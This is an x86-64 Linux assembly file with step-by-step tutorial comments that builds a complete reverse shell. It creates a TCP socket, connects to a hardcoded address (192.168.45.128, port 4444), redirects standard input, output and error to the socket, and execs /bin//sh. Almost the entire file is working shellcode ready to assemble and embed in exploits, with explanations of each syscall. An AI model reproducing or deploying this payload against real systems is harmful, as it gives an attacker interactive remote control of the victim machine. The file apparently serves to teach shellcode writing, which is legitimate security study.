global _start

section .text

_start:

; we need to xor the registers before using them using 
	xor rax, rax
	xor rbx, rbx
	xor rcx, rcx
	xor rdx, rdx
	xor rdi, rdi
	xor rsi, rsi

; We have 4 steps to create a reverse shell
; 1- Create a socket (using the socket system call)
; 2- Connect to the server (using the connect system call)
; 3- Redirect the standard input, output, and error to the socket (using the dup2 system call)
; 4- Execute the shell (using the execve system call)


; Socket creation socket(int domain, int type, int protocol) --> (socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) 
; you can find it in https://man7.org/linux/man-pages/man2/socket.2.html
	mov al, 41 ; SYS_SOCKET call = 41 (0x29) you can find it in https://x64.syscall.sh/ (RAX)
	mov dil, 2 ;  Domain AF_INET (IPV4)= 2 (RDI) 
	mov sil, 1 ; Type SOCK_STREAM (this type of socket is used to establish TCP Connection)= 1 (RSI)
	mov dl, 6 ; protocol IPPROTO_TCP = 6 (RDX) ; you can find it in /etc/protocols
	syscall ; Call the syscall

; On success, a file descriptor for the new socket is returned, and on failure, -1 is returned.
    ; We store the file descriptor in r8 register 
    mov r8, rax

; Now we need to connect to the server using connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) 
;--> (connect(sockfd, &addr, sizeof(addr))) ; you can find it in https://man7.org/linux/man-pages/man2/connect.2.html
; We need to prepare the sockaddr_in structure
	sub rsp, 8 ; we allocate 8 bytes on the stack
	; we need 3 things for the sockaddr_in structure : sin_family, sin_port, sin_addr
	mov WORD[rsp],0x2 ; sin_family : AF_INET (IPV4)= 2 (little-endian)	 
	mov WORD[rsp+0x2],0x5c11 ; sin_port : 4444 en héxa = 115c but in assembly we reverse all the bytes (little-endian)
	mov DWORD[rsp+0x4], 0x802da8c0 ; sin_addr : IP address of the server in little-endian.
	; sin_zero is not necessary because it's only used to pad the structure to the size of a struct sockaddr.
	mov rsi, rsp ; Here the structure is on the stack (RSP) so RSI takes the value of the address of RSP 
	;reason --> because in the syscall we store the address of the structure in RSI (see https://x64.syscall.sh/ for more information)

; Now we can connect to the server

	mov dl, 16 ; 16 bytes for the sockaddr_in structure for (sin_family (short), sin_port (short), sin_addr (int), sin_zero (8 bytes))
	push r8 ; we push the file descriptor of the socket on the stack
	pop rdi ; we pop the file descriptor of the socket in RDI (reason --> because in the syscall we store the file descriptor 
	;in RDI (see https://x64.syscall.sh/ for more information)
	; We could do mov rdi, r8 but we need to save the file descriptor of the socket for the next syscalls
	mov al, 42 ; SYS_CONNECT call = 42 (0x2A) you can find it in https://x64.syscall.sh/ (RAX)
	syscall

; Now we need to redirect the standard input, output, and error to the socket using dup2(int oldfd, int newfd) 
; --> (dup2(sockfd, 0), dup2(sockfd, 1), dup2(sockfd, 2)) ; you can find it in https://man7.org
	
	; redirecting the standard input to the socket
	mov al, 33 ; SYS_DUP2 call = 33 (0x21) you can find it in https://x64.syscall.sh/ (RAX)
	push r8 ; we push the file descriptor of the socket on the stack
	pop rdi ; we pop the file descriptor of the socket in RDI
	xor rsi, rsi ; we xor RSI to get 0 because we want to redirect the standard input (0)
	syscall

	; redirecting the standard output to the socket
	mov al, 33 ; SYS_DUP2 call = 33 (0x21) you can find it in https://x64.syscall.sh/ (RAX)
	push r8 ; we push the file descriptor of the socket on the stack
	pop rdi ; we pop the file descriptor of the socket in RDI
	mov sil, 1 ; we put 1 in RSI because we want to redirect the standard output (1)
	syscall

	; redirecting the standard error to the socket
	mov al, 33 ; SYS_DUP2 call = 33 (0x21) you can find it in https://x64.syscall.sh/ (RAX)
	push r8 ; we push the file descriptor of the socket on the stack
	pop rdi ; we pop the file descriptor of the socket in RDI
	mov sil, 2 ; we put 2 in RSI because we want to redirect the standard error (2)
	syscall

; Now we can execute the shell using execve(const char *pathname, char *const argv[], char *const envp[]) 
; --> (execve("/bin//sh", NULL, NULL)) ; you can find it in https://man7.org/linux/man-pages/man2/execve.2.html
	xor rsi, rsi ; we xor RSI to get 0 because we don't have any arguments to pass to execve
	push rsi ; We push 0 on the stack
	mov rdi, 0x68732f2f6e69622f   ; We put the string "/bin//sh" in RDI
	push rdi ; We push the address of the string "/bin//sh" on the stack
	push rsp ; We push the address of the string "/bin//sh" on the stack
	pop rdi ; We pop the address of the string "/bin//sh" in RDI
	mov al, 59 ; SYS_EXECVE call = 59 (0x3B) you can find it in https://x64.syscall.sh/ (RAX)
	cdq ; We clear RDX because we don't have any arguments to pass to execve
	syscall 